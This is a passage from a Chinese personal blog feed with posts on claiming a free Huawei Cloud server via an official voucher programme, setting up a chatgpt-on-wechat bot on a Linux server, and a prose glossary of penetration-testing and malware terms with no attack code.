id="我是在线课程-培训班-训练营的老师-学生，可以申请FOFA教育账号吗？"><a href="#我是在线课程-培训班-训练营的老师-学生，可以申请FOFA教育账号吗？" class="headerlink" title="我是在线课程&#x2F;培训班&#x2F;训练营的老师&#x2F;学生，可以申请FOFA教育账号吗？"></a>我是在线课程&#x2F;培训班&#x2F;训练营的老师&#x2F;学生，可以申请FOFA教育账号吗？</h2><p>不能，FOFA教育账号目前仅对国家正规高校师生开放，您可以查看我们的会员服务，选择您所需的账号权限进行购买。</p><h2 id="我在国家认可的教育机构工作，希望获得FOFA教育账号用于校内项目的实验和研究，合适吗？"><a href="#我在国家认可的教育机构工作，希望获得FOFA教育账号用于校内项目的实验和研究，合适吗？" class="headerlink" title="我在国家认可的教育机构工作，希望获得FOFA教育账号用于校内项目的实验和研究，合适吗？"></a>我在国家认可的教育机构工作，希望获得FOFA教育账号用于校内项目的实验和研究，合适吗？</h2><p>不合适，FOFA教育账号仅可用于个人的学习或学术研究。如您需要将其用于其他目的，例如内部教学产品或服务的研发，我们可以提供折扣和专项合作，您可以联系 FofaBot 描述您的需求。</p><p><a href="https://fofa.info/SchoolRegister"><strong>FOFA大学生白嫖会员入口</strong></a></p><p>请大家拿到会员时候给我点点赞和收藏哦~~</p>]]></content>
      
      
      <categories>
          
          <category> 白嫖指南 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于华为云服务器白嫖指南</title>
      <link href="/2024/12/15/%E5%85%B3%E4%BA%8E%E5%8D%8E%E4%B8%BA%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%99%BD%E5%AB%96%E6%8C%87%E5%8D%97/"/>
      <url>/2024/12/15/%E5%85%B3%E4%BA%8E%E5%8D%8E%E4%B8%BA%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%99%BD%E5%AB%96%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="关于华为云服务器白嫖指南"><a href="#关于华为云服务器白嫖指南" class="headerlink" title="关于华为云服务器白嫖指南"></a>关于华为云服务器白嫖指南</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">大致步骤：</span><br><span class="line">每个已实名的华为云用户都可以申请，使能方向选择加入个人，沃土云创计划加入个人方向，填号码和邮箱提交申请就行</span><br><span class="line">激励管理--计划权益--学习代金券（云服务）--申请</span><br><span class="line">购买时不能选一年的，一年的有优惠，不能用代金券</span><br><span class="line"></span><br><span class="line">活动地址：https://developer.huaweicloud.com/programs/dev-program.html</span><br><span class="line"></span><br><span class="line">购买入口：https://www.huaweicloud.com/product/flexus-l.html</span><br></pre></td></tr></table></figure><h2 id="第一步：打开活动地址"><a href="#第一步：打开活动地址" class="headerlink" title="第一步：打开活动地址"></a>第一步：打开活动地址</h2><p>首先我们先进入到<a href="https://developer.huaweicloud.com/programs/dev-program.html">沃土云创计划</a>，然后我们点击下方的个人计划中的加入</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215132954711.png" alt="image-20241215132954328"></p><h2 id="第二步：实名认证"><a href="#第二步：实名认证" class="headerlink" title="第二步：实名认证"></a>第二步：实名认证</h2><p>这个会让你去实名认证一下才可以加入计划，所以我们就去实名认证一下，回到刚刚的创计划网站上，我们鼠标移至右上角的账户信息那边，会跳出来一个未实名认证，这时候点击他</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215133136670.png" alt="image-20241215133136354"></p><p>然后点击上方的立即认证</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215133258761.png" alt="image-20241215133258574"></p><p>我们选择个人认证，然后下面三个认证方式随便选一个认证即可</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215133327122.png" alt="image-20241215133326919"><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215133336849.png" alt="image-20241215133336632"></p><h2 id="第三步：加入计划"><a href="#第三步：加入计划" class="headerlink" title="第三步：加入计划"></a>第三步：加入计划</h2><p>认证成功之后，重新点击刚刚创计划的立即加入，把自己的信息填写下去，电话和邮箱填一下，下面的随便选就可以了</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215133633516.png" alt="image-20241215133633330"></p><p>然后出现这个页面就表示你已经加入成功了</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215133743384.png" alt="image-20241215133743202"></p><h2 id="第四步：申请代金券"><a href="#第四步：申请代金券" class="headerlink" title="第四步：申请代金券"></a>第四步：申请代金券</h2><p>打开开发者空间下面的<strong>激励管理-计划权益</strong>，我们可以看到我们的代金券就已经可以申请了，我们点击申请一下</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215133842912.png" alt="image-20241215133842720"></p><p>点击他弹出来的费用中心，我们跳转到费用中心界面</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215134007051.png" alt="image-20241215134006862"></p><p>然后我们可以看到我们的价值401元的代金券已经到我们的账号上面了</p><h2 id="第五步：购买服务器"><a href="#第五步：购买服务器" class="headerlink" title="第五步：购买服务器"></a>第五步：购买服务器</h2><p>打开**<a href="https://console.huaweicloud.com/smb/?agencyId=f2b299d0bd2542c3b785c7f07d3ae284&region=cn-north-4&locale=zh-cn#/create/hecs-light?period=month_1&image_name=BT&plan=basic_v9&resource_spec_code=hf.large.1.2m.linux">购买Flexus应用服务器L实例</a>**界面选择自己需要的系统镜像和时长即可，现在活动规则改变了，我之前可以撸十四个月的香港服务器，但是现在只能撸9个月的大陆服务器了。</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215134515035.png" alt="image-20241215134514855"></p><p>然后我们点击立即购买，使用我们的代金券，就可以实现0元购了，快去试试吧！</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215134609402.png" alt="image-20241215134609214"></p>]]></content>
      
      
      <categories>
          
          <category> 白嫖指南 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>保姆级微信 AI 机器人教程：如何打造私人和群聊助手</title>
      <link href="/2024/12/13/%E4%BF%9D%E5%A7%86%E7%BA%A7%E5%BE%AE%E4%BF%A1_AI_%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%95%99%E7%A8%8B%EF%BC%9A%E5%A6%82%E4%BD%95%E6%89%93%E9%80%A0%E7%A7%81%E4%BA%BA%E5%92%8C%E7%BE%A4%E8%81%8A%E5%8A%A9%E6%89%8B/"/>
      <url>/2024/12/13/%E4%BF%9D%E5%A7%86%E7%BA%A7%E5%BE%AE%E4%BF%A1_AI_%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%95%99%E7%A8%8B%EF%BC%9A%E5%A6%82%E4%BD%95%E6%89%93%E9%80%A0%E7%A7%81%E4%BA%BA%E5%92%8C%E7%BE%A4%E8%81%8A%E5%8A%A9%E6%89%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="保姆级微信-AI-机器人教程：如何打造私人和群聊助手"><a href="#保姆级微信-AI-机器人教程：如何打造私人和群聊助手" class="headerlink" title="保姆级微信 AI 机器人教程：如何打造私人和群聊助手"></a>保姆级微信 AI 机器人教程：如何打造私人和群聊助手</h1><h2 id="第一步：配置python环境从源代码编译安装"><a href="#第一步：配置python环境从源代码编译安装" class="headerlink" title="第一步：配置python环境从源代码编译安装"></a>第一步：配置python环境从源代码编译安装</h2><p>下载Python源代码 访问Python官方网站下载页面（<a href="https://www.python.org/downloads/source/%EF%BC%89%EF%BC%8C%E6%89%BE%E5%88%B0Python">https://www.python.org/downloads/source/），找到Python</a> 3.9.6的源代码包（通常是.tar.xz格式），然后使用wget或curl命令下载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.9.6/Python-3.9.6.tar.xz</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241207235902647.png" alt="e065b2d7ad5c219fd340c664e367f0f"></p><p>解压源代码包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar xvf Python-3.9.6.tar.xz  </span><br><span class="line"><span class="built_in">cd</span> Python-3.9.6</span><br></pre></td></tr></table></figure><p>安装依赖 根据您的Linux发行版安装必要的编译依赖。对于Debian&#x2F;Ubuntu系统，可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update  <span class="comment">#更新apt安装包</span></span><br><span class="line"><span class="built_in">sudo</span> apt install -y build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev wget <span class="comment">#安装必要依赖</span></span><br></pre></td></tr></table></figure><p>编译并安装Python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local  </span><br><span class="line">make -j $(<span class="built_in">nproc</span>)  </span><br><span class="line"><span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241207235923367.png"><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241208000104703.png" alt="d4e1210f9d583b9971b14193d8e0e49"></p><p>–prefix&#x3D;&#x2F;usr&#x2F;local 指定了Python的安装目录，您可以根据需要更改。<br>验证安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/python3.9 --version</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 --version</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241208001711307.png" alt="92f95e6a48ab9caeb13617a1e0c8c28">可以看到python环境已经搭建好了</p><p>第二步：下载github的CoW项目代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install git#下载一下git</span><br><span class="line">git clone https://github.com/zhayujie/chatgpt-on-wechat//克隆项目代码</span><br><span class="line">cd chatgpt-on-wechat/ //进入chatgpt目录</span><br></pre></td></tr></table></figure><p>注: 如遇到网络问题可选择国内镜像 <a href="https://gitee.com/zhayujie/chatgpt-on-wechat">https://gitee.com/zhayujie/chatgpt-on-wechat</a></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241208000133583.png" alt="93dc08320809ab8268374c8f5299ac6"></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241208000158837.png" alt="5b1f4088781424bcae951c2e826bdbf"><strong>(2) 安装核心依赖 (必选)：</strong></p><p>能够使用<code>itchat</code>创建机器人，并具有文字交流功能所需的最小依赖集合。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241208000304065.png" alt="a88e6c57f54b1cf91ca91d3b5082776">用pip3下载请求包里面的东西，发现会报错我们只要更新一下就好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241208001731803.png" alt="15c0fd5dbcc633de4c7897bcae3263e">我们后面在运行就可以发现不报错了</p><p><strong>(3) 拓展依赖 (可选，建议安装)：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements-optional.txt</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241208000315782.png" alt="5525cd3c0cf4c48f38aae29b0c7db7a">这p镜像太慢了，等了我好久，nmmd反正就等她下载完就可以了</p><p>如果某项依赖安装失败可注释掉对应的行再继续</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241208000336589.png" alt="0748da81d1db93a4d2244561c586086"></p><h2 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h2><p>配置文件的模板在根目录的<code>config-template.json</code>中，需复制该模板创建最终生效的 <code>config.json</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> config-template.json config.json //复制一份模板</span><br><span class="line">vi config.json//填入配置</span><br><span class="line">//**其中你要点击i是插入，才可以改动，然后改完了之后点击ESC，再输入：wq才能保存并且成功退出</span><br></pre></td></tr></table></figure><p>然后在<code>config.json</code>中填入配置，以下是对默认配置的说明，可根据需要进行自定义修改（注意实际使用时请去掉注释，保证JSON格式的完整）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># config.json文件内容示例</span><br><span class="line">&#123;</span><br><span class="line">  &quot;model&quot;: &quot;gpt-3.5-turbo&quot;,                                   # 模型名称, 支持 gpt-3.5-turbo, gpt-4, gpt-4-turbo, wenxin, xunfei, glm-4, claude-3-haiku, moonshot</span><br><span class="line">  &quot;open_ai_api_key&quot;: &quot;YOUR API KEY&quot;,                          # 如果使用openAI模型则填入上面创建的 OpenAI API KEY</span><br><span class="line">  &quot;proxy&quot;: &quot;&quot;,                                                # 代理客户端的ip和端口，国内环境开启代理的需要填写该项，如 &quot;127.0.0.1:7890&quot;</span><br><span class="line">  &quot;single_chat_prefix&quot;: [&quot;bot&quot;, &quot;@bot&quot;],                      # 私聊时文本需要包含该前缀才能触发机器人回复</span><br><span class="line">  &quot;single_chat_reply_prefix&quot;: &quot;[bot] &quot;,                       # 私聊时自动回复的前缀，用于区分真人</span><br><span class="line">  &quot;group_chat_prefix&quot;: [&quot;@bot&quot;],                              # 群聊时包含该前缀则会触发机器人回复</span><br><span class="line">  &quot;group_name_white_list&quot;: [&quot;ChatGPT测试群&quot;, &quot;ChatGPT测试群2&quot;], # 开启自动回复的群名称列表</span><br><span class="line">  &quot;group_chat_in_one_session&quot;: [&quot;ChatGPT测试群&quot;],              # 支持会话上下文共享的群名称  </span><br><span class="line">  &quot;image_create_prefix&quot;: [&quot;画&quot;, &quot;看&quot;, &quot;找&quot;],                   # 开启图片回复的前缀</span><br><span class="line">  &quot;conversation_max_tokens&quot;: 1000,                            # 支持上下文记忆的最多字符数</span><br><span class="line">  &quot;speech_recognition&quot;: false,                                # 是否开启语音识别</span><br><span class="line">  &quot;group_speech_recognition&quot;: false,                          # 是否开启群组语音识别</span><br><span class="line">  &quot;voice_reply_voice&quot;: false,                                 # 是否使用语音回复语音</span><br><span class="line">  &quot;character_desc&quot;: &quot;你是基于大语言模型的AI智能助手，旨在回答并解决人们的任何问题，并且可以使用多种语言与人交流。&quot;,  # 人格描述</span><br><span class="line">  # 订阅消息，公众号和企业微信channel中请填写，当被订阅时会自动回复，可使用特殊占位符。目前支持的占位符有&#123;trigger_prefix&#125;，在程序中它会自动替换成bot的触发词。</span><br><span class="line">  &quot;subscribe_msg&quot;: &quot;感谢您的关注！\n这里是ChatGPT，可以自由对话。\n支持语音对话。\n支持图片输出，画字开头的消息将按要求创作图片。\n支持角色扮演和文字冒险等丰富插件。\n输入&#123;trigger_prefix&#125;#help 查看详细指令。&quot;,</span><br><span class="line">  &quot;use_linkai&quot;: false,                                        # 是否使用LinkAI接口，默认关闭，开启后可国内访问，使用知识库和MJ</span><br><span class="line">  &quot;linkai_api_key&quot;: &quot;&quot;,                                       # LinkAI Api Key</span><br><span class="line">  &quot;linkai_app_code&quot;: &quot;&quot;                                       # LinkAI 应用或工作流code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们再这边选择是调试linkai的接口</p><p><a href="https://link-ai.tech/home?code=011MSc000ZGNhT1LKu100iQwDA3MSc01&state=1">https://link-ai.tech/home?code=011MSc000ZGNhT1LKu100iQwDA3MSc01&amp;state=1</a></p><p>我们可以打开网站，并且注册一个账号，创建一个应用</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241208000352121.png" alt="e30f0858c50c7e81ea2b653c8d8183f">添加自己合适的模型与插件</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241208000407878.png" alt="ea0298061f4ae0f5db51cd4a319d8f8">记住自己的api code和apikey，并且填入其中<strong>（其他的不需要改动！！！）</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241208000431446.png" alt="1d0e7d6103cdbcb0ab8ae9e1805df9b"></p><h3 id="服务器部署"><a href="#服务器部署" class="headerlink" title="服务器部署"></a>服务器部署</h3><p>使用nohup命令在后台运行程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nohup</span> python3 app.py &amp; <span class="built_in">tail</span> -f nohup.out          <span class="comment"># 在后台运行程序并通过日志输出二维码</span></span><br></pre></td></tr></table></figure><p>扫码登录后程序即可运行于服务器后台，此时可通过 <code>ctrl+c</code> 关闭日志，不会影响后台程序的运行。使用 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep app.py | grep -v grep</span><br></pre></td></tr></table></figure><p> 命令可查看运行于后台的进程，如果想要重新启动程序可以先 <code>kill</code> 掉对应的进程。日志关闭后如果想要再次打开只需输入 <code>tail -f nohup.out</code>。此外，<code>scripts</code> 目录下有一键运行、关闭程序的脚本供使用。</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213233745928.png" alt="image-20241213233745748">扫码后出现这个就是登陆成功了，接下来你就可以随心所欲的和你的AI机器人聊天了，快试试吧，属于你自己的AI微信机器人</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213234008047.png" alt="image-20241213234007842"></p><p><strong>多账号支持：</strong> 将项目复制多份，分别启动程序，用不同账号扫码登录即可实现同时运行。</p><p><strong>特殊指令：</strong> 用户向机器人发送 <strong>#reset</strong> 即可清空该用户的上下文记忆。</p>]]></content>
      
      
      <categories>
          
          <category> 娱乐项目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试常用专业术语</title>
      <link href="/2024/12/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD/"/>
      <url>/2024/12/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD/</url>
      
        <content type="html"><![CDATA[<p><font style="color:rgb(0, 0, 0);">相信大家和我一样，搞不清这些专业名词的区别，所以我来整理一下渗透测试常用的专业术语。</font></p><h2 id="1-POC、EXP、Payload与Shellcode"><a href="#1-POC、EXP、Payload与Shellcode" class="headerlink" title="1. POC、EXP、Payload与Shellcode"></a><strong><font style="color:rgb(0, 0, 0);">1. POC、EXP、Payload与Shellcode</font></strong></h2><p><font style="color:rgb(0, 0, 0);">POC：全称 ‘ Proof of Concept ‘，中文 ‘ 概念验证 ‘ ，常指一段漏洞证明的代码。</font></p><p><font style="color:rgb(0, 0, 0);">EXP：全称 ‘ Exploit ‘，中文 ‘ 利用 ‘，指利用系统漏洞进行攻击的动作。</font></p><p><font style="color:rgb(0, 0, 0);">Payload：中文 ‘ 有效载荷 ‘，指成功exploit之后，真正在目标系统执行的代码或指令。</font></p><p><font style="color:rgb(0, 0, 0);">Shellcode：简单翻译 ‘ shell代码 ‘，是Payload的一种，由于其建立正向&#x2F;反向shell而得名。</font></p><h2 id="2-几点注意"><a href="#2-几点注意" class="headerlink" title="2. 几点注意"></a><strong><font style="color:rgb(0, 0, 0);">2. 几点注意</font></strong></h2><p><font style="color:rgb(0, 0, 0);">POC是用来证明漏洞存在的，EXP是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了POC，才有EXP。</font></p><p><font style="color:rgb(0, 0, 0);">Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP。</font></p><p><font style="color:rgb(0, 0, 0);">Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。</font></p><p><font style="color:rgb(0, 0, 0);">Shellcode与Shellshcok不是一个，Shellshock特指14年发现的Shellshock漏洞。</font></p><h2 id="3-Payload模块"><a href="#3-Payload模块" class="headerlink" title="3. Payload模块"></a><strong><font style="color:rgb(0, 0, 0);">3. Payload模块</font></strong></h2><p><font style="color:rgb(0, 0, 0);">在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用Stager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。</font></p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a><strong><font style="color:rgb(0, 0, 0);">4. 总结</font></strong></h2><p><font style="color:rgb(0, 0, 0);">想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个POC。之后你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了它家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的录音笔，这一天你所做的就是一个EXP，你在他家所做的就是不同的Payload，就把录音笔当作Shellcode吧！</font></p><p><font style="color:rgb(0, 0, 0);">Top</font></p><h1 id="加更：暗网"><a href="#加更：暗网" class="headerlink" title="加更：暗网"></a><font style="color:rgb(0, 0, 0);">加更：暗网</font></h1><p><font style="color:rgb(0, 0, 0);">我是会把我遇到很晦涩或者难以理解的词语分享到这的。</font></p><p><font style="color:rgb(0, 0, 0);">暗网这个词是我在b站偶然看到一个叫经常给开发找麻烦的金子姑娘的视频，她的解释让我理解了这个词，所以解释一下。暗网并不是那种灰色交易遍布，人们谁也不认谁，很罪恶的地方，充满着人性的负面。暗网其实就是带密码的空间，就像我们的qq空间。网络世界10%在表面，剩下的就是暗网。浏览器的搜索引擎其实就是利用爬虫把各个网页资源整合到一起，他也有进不去的地方，就像地图软件除了用卫星还有人工测绘人员，他们就像爬虫一样，总有到达不了的暗网。这里提到tor浏览器（洋葱），这个浏览器的原理就是a如果想把消息给b，a把消息给c，c给d，d给e。经过层层代理，导致无法确定人们的踪迹，所以慢慢的这里就成为了罪犯最好的集聚地。这里加一个匿名浏览器tor的详细介绍：<a href="https://www.cnblogs.com/liun1994/p/6435505.html">https://www.cnblogs.com/liun1994/p/6435505.html</a>                   ————2020&#x2F;09&#x2F;19</font></p><h1 id="转大佬笔记"><a href="#转大佬笔记" class="headerlink" title="转大佬笔记"></a><font style="color:rgb(0, 0, 0);">转大佬笔记</font></h1><p><font style="color:rgb(0, 0, 0);">转载自教父博客：<a href="https://www.jiaofutql.cn/20/#title-7">https://www.jiaofutql.cn/20/#title-7</a></font></p><h1 id="一、攻击篇"><a href="#一、攻击篇" class="headerlink" title="一、攻击篇"></a><font style="color:rgb(0, 0, 0);">一、攻击篇</font></h1><h2 id="1．攻击工具"><a href="#1．攻击工具" class="headerlink" title="1．攻击工具"></a><font style="color:rgb(0, 0, 0);">1．攻击工具</font></h2><h3 id="肉鸡"><a href="#肉鸡" class="headerlink" title="肉鸡"></a><font style="color:rgb(0, 0, 0);">肉鸡</font></h3><p><font style="color:rgb(0, 0, 0);">所谓“肉鸡”是一种很形象的比喻，比喻那些可以被攻击者控制的电脑、手机、服务器或者其他摄像头、路由器等智能设备，用于发动网络攻击。<br></font><font style="color:rgb(0, 0, 0);">例如在2016年美国东海岸断网事件中，黑客组织控制了大量的联网摄像头用于发动网络攻击，这些摄像头则可被称为“肉鸡”。</font></p><h3 id="僵尸网络"><a href="#僵尸网络" class="headerlink" title="僵尸网络"></a><font style="color:rgb(0, 0, 0);">僵尸网络</font></h3><p><font style="color:rgb(0, 0, 0);">僵尸网络 Botnet 是指采用一种或多种传播手段，将大量主机感染病毒，从而在控制者和被感染主机之间所形成的一个可一对多控制的网络。<br></font><font style="color:rgb(0, 0, 0);">僵尸网络是一个非常形象的比喻，众多的计算机在不知不觉中如同中国古老传说中的僵尸群一样被人驱赶和指挥着，成为被攻击者执行各类恶意活动（DDOS、垃圾邮件等）利用的一种基础设施。</font></p><h3 id="木马"><a href="#木马" class="headerlink" title="木马"></a><font style="color:rgb(0, 0, 0);">木马</font></h3><p><font style="color:rgb(0, 0, 0);">就是那些表面上伪装成了正常的程序，但是当这些程序运行时，就会获取系统的整个控制权限。</font></p><p><font style="color:rgb(0, 0, 0);">有很多黑客就是热衷使用木马程序来控制别人的电脑，比如灰鸽子、Gh0st、PcShare等等。</font></p><h3 id="网页木马"><a href="#网页木马" class="headerlink" title="网页木马"></a><font style="color:rgb(0, 0, 0);">网页木马</font></h3><p><font style="color:rgb(0, 0, 0);">表面上伪装成普通的网页或是将恶意代码直接插入到正常的网页文件中，当有人访问时，网页木马就会利用对方系统或者浏览器的漏洞自动将配置好的木马服务端植入到访问者的电脑上来自动执行将受影响的客户电脑变成肉鸡或纳入僵尸网络。</font></p><h3 id="Rootkit"><a href="#Rootkit" class="headerlink" title="Rootkit"></a><font style="color:rgb(0, 0, 0);">Rootkit</font></h3><p><font style="color:rgb(0, 0, 0);">Rootkit是攻击者用来隐藏自己的行踪和保留root（根权限，可以理解成WINDOWS下的system或者管理员权限）访问权限的工具。<br></font><font style="color:rgb(0, 0, 0);">通常，攻击者通过远程攻击的方式获得root访问权限，或者是先使用密码猜解（破解）的方式获得对系统的普通访问权限，进入系统后，再通过对方系统存在的安全漏洞获得系统的root或system权限。<br></font><font style="color:rgb(0, 0, 0);">然后，攻击者就会在对方的系统中安装Rootkit，以达到自己长久控制对方的目的，Rootkit功能上与木马和后门很类似，但远比它们要隐蔽。</font></p><h3 id="蠕虫病毒"><a href="#蠕虫病毒" class="headerlink" title="蠕虫病毒"></a><font style="color:rgb(0, 0, 0);">蠕虫病毒</font></h3><p><font style="color:rgb(0, 0, 0);">它是一类相对独立的恶意代码，利用了联网系统的开放性特点，通过可远程利用的漏洞自主地进行传播，受到控制终端会变成攻击的发起方，尝试感染更多的系统。<br></font><font style="color:rgb(0, 0, 0);">蠕虫病毒的主要特性有：自我复制能力、很强的传播性、潜伏性、特定的触发性、很大的破坏性。</font></p><h3 id="震网病毒"><a href="#震网病毒" class="headerlink" title="震网病毒"></a><font style="color:rgb(0, 0, 0);">震网病毒</font></h3><p><font style="color:rgb(0, 0, 0);">又名Stuxnet病毒，是第一个专门定向攻击真实世界中基础（能源）设施的“蠕虫”病毒，比如核电站，水坝，国家电网。<br></font><font style="color:rgb(0, 0, 0);">作为世界上首个网络“超级破坏性武器”，Stuxnet的计算机病毒已经感染了全球超过 45000个网络，其目标伊朗的铀浓缩设备遭到的攻击最为严重。</font></p><h3 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a><font style="color:rgb(0, 0, 0);">勒索病毒</font></h3><p><font style="color:rgb(0, 0, 0);">主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。</font></p><h3 id="挖矿木马"><a href="#挖矿木马" class="headerlink" title="挖矿木马"></a><font style="color:rgb(0, 0, 0);">挖矿木马</font></h3><p><font style="color:rgb(0, 0, 0);">一种将PC、移动设备甚至服务器变为矿机的木马，通常由挖矿团伙植入，用于挖掘比特币从而赚取利益。</font></p><h3 id="攻击载荷"><a href="#攻击载荷" class="headerlink" title="攻击载荷"></a><font style="color:rgb(0, 0, 0);">攻击载荷</font></h3><p><font style="color:rgb(0, 0, 0);">攻击载荷（Payload）是系统被攻陷后执行的多阶段恶意代码。<br></font><font style="color:rgb(0, 0, 0);">通常攻击载荷附加于漏洞攻击模块之上，随漏洞攻击一起分发，并可能通过网络获取更多的组件。</font></p><h3 id="嗅探器（Sniffer）"><a href="#嗅探器（Sniffer）" class="headerlink" title="嗅探器（Sniffer）"></a><font style="color:rgb(0, 0, 0);">嗅探器（Sniffer）</font></h3><p><font style="color:rgb(0, 0, 0);">就是能够捕获网络报文的设备或程序。嗅探器的正当用处在于分析网络的流量，以便找出所关心的网络中潜在的问题。</font></p><h3 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a><font style="color:rgb(0, 0, 0);">恶意软件</font></h3><p><font style="color:rgb(0, 0, 